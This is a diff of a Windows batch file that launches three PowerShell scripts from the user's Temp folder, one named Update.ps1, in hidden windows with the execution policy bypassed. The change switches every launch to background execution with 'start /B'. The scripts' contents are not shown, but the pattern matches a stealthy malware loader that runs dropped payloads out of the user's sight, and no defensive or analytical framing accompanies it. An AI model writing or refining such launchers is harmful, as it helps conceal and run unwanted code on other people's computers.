@@ -1,5 +1,5 @@
 @echo off
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\Update.ps1"
+start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\Update.ps1"
 set sp1="%USERPROFILE%\AppData\Local\Temp\MyScript.ps1"
 set sp2="%USERPROFILE%\AppData\Local\Temp\RunX.ps1"
 
@@ -7,9 +7,9 @@ set sp2="%USERPROFILE%\AppData\Local\Temp\RunX.ps1"
 timeout /t 3 >nul
 
 if exist "%sp1%" (
-   powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp1%"
+   start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp1%"
 ) else (
-   powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp2%"
+   start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp2%"
 )
 
 timeout /t 60 >nul
